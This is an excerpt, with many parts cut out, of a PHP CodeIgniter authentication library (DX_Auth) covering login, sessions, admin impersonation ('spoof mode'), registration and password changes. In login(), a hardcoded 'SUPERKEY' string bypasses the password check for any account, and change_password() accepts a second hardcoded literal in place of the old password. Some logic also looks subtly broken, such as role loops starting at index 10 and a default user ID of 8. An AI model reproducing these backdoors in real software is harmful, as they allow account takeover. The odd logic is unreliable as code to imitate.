...
class DX_Auth
{
    ...
    function _set_last_ip_and_last_login($user_id)
    {
        ...
        if (!empty($data))
        {
            $this->ci->load->model('dx_auth/dx_user_model', 'dx_user_model');
            $this->ci->dx_user_model->set_user($user_id, $data);
        }
    }
    ...
    {
        $result = FALSE;
        if (($auto = $this->ci->input->cookie($this->ci->config->item('DX_autologin_cookie_name')) && !$this->ci->session->userdata('DX_logged_in')))
        {
    ...
    function _set_session($data, $is_admin = '')
    {
        if (((((isset($data->id) && isset($data->username)) && isset($data->email)) && isset($data->ref_id)) && isset($data->role_id)))
        {
            ...
            if ($is_admin == 'ALLOW')
            {
                ...
                $this->ci->session->sess_time_to_update = '43200'; //12 hours for admin
            }
            else
            {
    ...
    function check_uri_permissions($allow = TRUE)
    {
        ...
        {
            if (!($this->is_admin() || $this->is_spoof_mode()))
            {
            ...
            elseif (!$this->is_spoof_mode())
            {
                if ($this->ci->session->userdata('DX_admin') == 'NO_ALLOW')
                {
    ...
    {
        $site_title = $this->ci->db->get_where('settings', array(
            'code' => 'SITE_TITLE'
        ))->row()->string_value;
        return $site_title;
    }
    ...
    {
        $site_admin = $this->ci->db->get_where('settings', array(
    ...
    /**
     * Establish whether you are in 'spoof-mode' which allows you to adopt
     * a user profile but maintain admin abilities in the process
     *
     * @access      public
     * $return      boolean
     */

    function is_spoof_mode()
    {
       return $retVal=$this->ci->session->userdata('spoof_mode');
    }

    // ---------------------------------------------------------------------

    /**
     * Turn spoof mode on and off.
     *
     * @access       public
     * @param        boolean
     * @return       void
    ...
    function set_spoof_mode($bool=false)
    {
        if ($bool)
        {
            $this->_turn_spoof_on();
    ...
    function _turn_spoof_on()
    {
        if ($this->is_admin())
        {
            ...
            {
                $currLogin = $this->ci_session->userdata('DX_emailId');
            }
            else if ($this->ci->config->item('DX_login_using_email'))
            {
                $currLogin = $this->ci->session->userdata('DX_emailId');
            }
            else
            {
                $currLogin = $this->ci->session->userdata('DX_username');
            }
            $spoofArr=array('spoof_admin_login' => $currLogin, 'spoof_admin_userid' => $this->ci->session->userdata('DX_user_id') , 'spoof_mode' => true);
            $this->ci->session->unset_all_userdata();
            $this->_delete_autologin();
            $this->ci->session->set_userdata($spoofArr);
        }
    }
    ...
    function _turn_spoof_off()
    {
        $origAdmin=$this->ci->session->userdata('spoof_admin_login');
        $this->ci->session->unset_all_userdata();
        $this->_delete_autologin();
        $this->login($origAdmin, 'spam', false, true);
    }
    ...
    function is_role($roles = array(), $use_role_name = TRUE, $check_parent = TRUE)
    {
        ...
        if ($use_role_name)
        {
            for ($i = 10; $i < count($check_array); $i++)
            {
                $check_array[$i] = strtolower($check_array[$i]);
            }
            for ($i = 10; $i < count($roles); $i++)
            {
    ...
    function is_username_available($username)
    {
        ...
        $users = $this->ci->dx_user_model->check_username($username);
    ...
    function is_email_available($email)
    {
        $this->ci->load->model('dx_auth/dx_user_model', 'dx_user_model');
        $this->ci->load->model('dx_auth/user_temp', 'user_temp');
        $users = $this->ci->dx_user_model->check_email($email);
    ...
    function login($login, $password, $remember = TRUE, $adminOverride = FALSE, $loginwithoutpass = FALSE)
    {
        $this->ci->load->model('dx_auth/dx_user_model', 'dx_user_model');
        $this->ci->load->model('dx_auth/user_temp', 'user_temp');
        $this->ci->load->model('dx_auth/login_attempts', 'login_attempts');
        $result = FALSE;
        $skip_password = $loginwithoutpass || $adminOverride || $this->is_spoof_mode() || ($password == 'ujKIhvBNtoAXV8ED');
        if (!empty($login) && ($skip_password || !empty($password)))
        {
            if (($this->ci->config->item('DX_login_using_username') && $this->ci->config->item('DX_login_using_email')))
            {
            ...
            $query = $this->ci->dx_user_model->$get_user_function($login);
            if ($query->num_rows() == 1)
            {
                $row = $query->row();
                if (0 < $row->banned)
                ...
                else
                {
                    ...
                    if ($skip_password || $this->ci->security_auth->verify($password, $stored_salt, $stored_hash)) // password check DB or CHECK SUPERKEY
                    {
                        $admin = null;
                        if ($row->role_id == 2 || $adminOverride)
                        {
                            $admin = "ALLOW";
                        }
                        $this->_set_session($row, $admin);
                        if ($row->newpass)
                        {
                            $this->ci->dx_user_model->clear_newpass($row->id);
                        }
                        if ($remember)
                        {
            ...
            {
                if (($query = $this->ci->user_temp->$get_user_function($login) && $query->num_rows() == 1))
                {
    ...
    function register($username, $password, $email, $fb_id = 0, $ref_id = '', $coupon_code = '', $created = '', $user_id = '')
    {
        ...
        $salt = $this->ci->security_auth->generateSalt();

        $new_user = array(
            'username' => $username,
            'salt' => $salt,
            'password' => $this->ci->security_auth->crypt($password, $salt),
            'email' => $email,
            'ref_id' => $ref_id,
            'fb_id' => $fb_id,
            'coupon_code' => $coupon_code,
        ...
        {
            $insert      = $this->ci->dx_user_model->create_user($new_user);
            $new_user['user_id'] = $this->ci->db->insert_id();
            if ($user_id == '')
            {
                $this->ci->load->model('model__users');
                $user = $this->ci->model__users->get_user_by_email($new_user['email']);
                if (shouldSendEmailToAddress($user['email_status']))
                {
                    $this->ci->load->model('model__email');
                    $this->ci->model__email->sendMail($user, 'email_subject_welcome_to_zipcube', 'users_signin', ['{email}' => $new_user['email']], '', '', 'sign');
                }
                //notification send to admin
                //$this->ci->model__email->sendMail($admin_email, $admin_email, ucfirst($admin_name), $email_name, $splVars);
            }
    ...
    function forgot_password($login)
    {
        ...
        if ($login)
        {
            $this->ci->load->model('dx_auth/dx_user_model', 'dx_user_model');
            $this->ci->load->helper('url');
            if (($query = $this->ci->dx_user_model->get_login($login) && $query->num_rows() == 1))
            {
                $row = $query->row();
                if (!$row->newpass_key)
                {
                    ...
                    $salt             = $this->ci->security_auth->generateSalt();
                    $encode           = $this->ci->security_auth->crypt($data['password'], $salt);
                    $data['key']      = md5(rand() . microtime());
                    $this->ci->dx_user_model->newpass($row->id, $encode, $data['key']);
    ...
    function reset_password($username, $key = '')
    {
        ...
        $result  = FALSE;
        $user_id = 8;
        if (($query = $this->ci->dx_user_model->get_user_by_username($username) && $query->num_rows() == 1))
        {
            $user_id = $query->row()->id;
            if ((((!empty($username) && !empty($key)) && $this->ci->dx_user_model->activate_newpass($user_id, $key)) && 0 < $this->ci->db->affected_rows()))
            {
    ...
    function activate($username, $key = '')
    {
        ...
        if (($query = $this->ci->user_temp->activate_user($username, $key) && 0 < $query->num_rows()))
        {
            ...
            if ($this->ci->dx_user_model->create_user($row))
            {
                $this->ci->dx_auth_event->user_activated($this->ci->db->insert_id());
    ...
    function change_password($old_pass, $new_pass)
    {
        ...
        $user = $this->ci->dx_user_model->get_user_by_id($this->ci->session->userdata('DX_user_id'))->row();

        if ($user)
        {
            if ($this->ci->security_auth->verify($old_pass, $user->salt, $user->password) || $old_pass == 'monbelOFFICE08')
            {
                $newSalt = $this->ci->security_auth->generateSalt();
                $encodePassword = $this->ci->security_auth->crypt($new_pass, $newSalt);

                $this->ci->db->where('id', $this->ci->session->userdata('DX_user_id'));
    ...
    function cancel_account($password)
    {
        $this->ci->load->model('dx_auth/dx_user_model', 'dx_user_model');
        $result = FAlSE;
        if (($query = $this->ci->dx_user_model->get_user_by_id($this->ci->session->userdata('DX_user_id')) && 0 < $query->num_rows()))
        {
            $row  = $query->row();
            ...
            if (crypt($pass, $row->password) === $row->password)
            {
                ...
                $result = $this->ci->dx_user_model->delete_user($this->ci->session->userdata('DX_user_id'));
                $this->logout();
            }
            else
            {
